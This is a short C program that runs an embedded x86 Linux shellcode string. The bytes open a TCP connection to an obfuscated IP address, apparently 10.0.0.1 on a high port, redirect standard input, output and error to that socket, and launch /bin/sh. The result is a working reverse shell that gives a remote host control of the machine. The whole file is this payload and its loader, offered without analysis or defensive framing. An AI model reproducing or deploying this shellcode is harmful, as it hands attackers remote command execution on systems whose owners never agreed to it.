#include <stdio.h>
#include <string.h>

int main(void) {
    unsigned char code[] = "\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x03\x03\x03\x03\xbb\x09\x01\x03\x02\x31\xc3\x53\x66\x68\xff\xf0\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

    printf("Shellcode length: %d\n", strlen(code));

    void (*s)() = (void *)code;
    s();

    return 0;
}
